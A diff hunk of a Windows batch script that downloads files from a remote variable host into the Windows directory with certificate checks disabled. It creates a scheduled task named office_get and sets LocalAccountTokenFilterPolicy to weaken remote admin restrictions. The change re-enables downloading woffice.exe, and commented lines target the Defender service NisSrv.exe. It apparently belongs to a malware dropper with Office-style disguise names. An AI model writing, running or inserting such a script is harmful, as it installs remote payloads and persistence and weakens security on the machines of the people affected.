@@ -72,7 +72,7 @@ wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
 wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
 schtasks /create /tn office_get /xml %windir%\office_get.xml /F
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-rem wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
+wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
 rem %windir%\wofficeie1.exe
 rem SLEEP 10
 rem taskkill /f /im NisSrv.exe
